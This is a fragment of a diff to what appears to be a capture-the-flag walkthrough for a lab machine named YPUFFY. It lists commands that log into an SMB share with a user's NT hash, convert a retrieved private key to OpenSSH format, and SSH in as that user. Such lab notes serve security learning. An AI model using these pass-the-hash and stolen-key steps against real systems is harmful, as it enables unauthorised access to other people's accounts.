@@ -40,5 +40,8 @@ Service Info: Host: YPUFFY
 	IPC$            IPC       IPC Service (Samba Server)
 
 4. smbclient -U alice1978 --pw-nt-hash //10.10.10.107/alice/ 0B186E661BBDBDCF6047784DE8B9FD8B
+
+5. puttygen my_private_key.ppk -O private-openssh -o alice_private
 get the private key
 
+6. ssh -i alice_private alice1978@10.10.10.107
